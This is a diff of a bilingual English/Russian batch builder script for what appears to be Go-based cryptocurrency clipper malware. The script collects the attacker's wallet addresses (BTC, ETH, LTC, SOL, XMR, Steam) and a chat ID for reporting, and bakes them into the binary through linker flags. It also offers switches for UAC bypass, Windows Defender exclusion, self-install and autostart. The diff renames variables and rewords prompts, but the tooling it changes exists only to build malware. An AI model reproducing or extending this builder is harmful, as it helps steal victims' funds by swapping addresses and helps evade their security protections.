@@ -18,6 +18,8 @@ set /p "CHAT_ID=Chat ID or Group ID / Ваш чат ID или ID группы: "
 
 echo.
 
+echo If you don't use address, enter '0' / Если вы не используете адрес, введите '0'
+
 set /p "BTC=BTC address / Адрес BTC: "
 set /p "ETH=ETH address / Адрес ETH: "
 set /p "LTC=LTC address / Адрес LTC: "
@@ -54,19 +56,19 @@ echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
 echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| builder
 echo.
 
-set /p "ENABLE_INSTALL=Enable installation / Включить установку (y/n) [y]: "
+set /p "ENABLE_INSTALL=Enable installation / Включить установку? (y/n): "
 if "!ENABLE_INSTALL!"=="" set "ENABLE_INSTALL=y"
 if /i "!ENABLE_INSTALL!"=="y" (set "INSTALL_FLAG=true") else (set "INSTALL_FLAG=false")
 
-set /p "ENABLE_UAC=Enable UAC bypass / Включить обход UAC (y/n) [y]: "
+set /p "ENABLE_UAC=Enable UAC bypass / Включить обход UAC? (y/n): "
 if "!ENABLE_UAC!"=="" set "ENABLE_UAC=y"
 if /i "!ENABLE_UAC!"=="y" (set "UAC_FLAG=true") else (set "UAC_FLAG=false")
 
-set /p "ENABLE_DEFENDER=Enable Defender exclusion / Включить исключение из Defender (y/n) [y]: "
+set /p "ENABLE_DEFENDER=Enable Defender exclusion / Включить исключение из Defender? (y/n): "
 if "!ENABLE_DEFENDER!"=="" set "ENABLE_DEFENDER=y"
 if /i "!ENABLE_DEFENDER!"=="y" (set "DEFENDER_FLAG=true") else (set "DEFENDER_FLAG=false")
 
-set /p "ENABLE_AUTOSTART=Enable autostart / Включить автозагрузку (y/n) [y]: "
+set /p "ENABLE_AUTOSTART=Enable autostart / Включить автозагрузку? (y/n): "
 if "!ENABLE_AUTOSTART!"=="" set "ENABLE_AUTOSTART=y"
 if /i "!ENABLE_AUTOSTART!"=="y" (set "AUTOSTART_FLAG=true") else (set "AUTOSTART_FLAG=false")
 
@@ -91,10 +93,10 @@ set "LDFLAGS=%LDFLAGS% -X main.SolAddr=%SOL%"
 set "LDFLAGS=%LDFLAGS% -X main.XmrAddr=%XMR%"
 set "LDFLAGS=%LDFLAGS% -X main.SteamAddr=%STEAM%"
 
-set "LDFLAGS=%LDFLAGS% -X main.enable_install=%INSTALL_FLAG%"
-set "LDFLAGS=%LDFLAGS% -X main.enable_uac_bypass=%UAC_FLAG%"
-set "LDFLAGS=%LDFLAGS% -X main.enable_defender_excluder=%DEFENDER_FLAG%"
-set "LDFLAGS=%LDFLAGS% -X main.enable_autostart=%AUTOSTART_FLAG%"
+set "LDFLAGS=%LDFLAGS% -X main.installSelf=%INSTALL_FLAG%"
+set "LDFLAGS=%LDFLAGS% -X main.uacBypass=%UAC_FLAG%"
+set "LDFLAGS=%LDFLAGS% -X main.defenderExcluder=%DEFENDER_FLAG%"
+set "LDFLAGS=%LDFLAGS% -X main.autoStart=%AUTOSTART_FLAG%"
 
 if defined GEO_BLOCK (
     set "GEO_BLOCK_CLEAN=!GEO_BLOCK!"
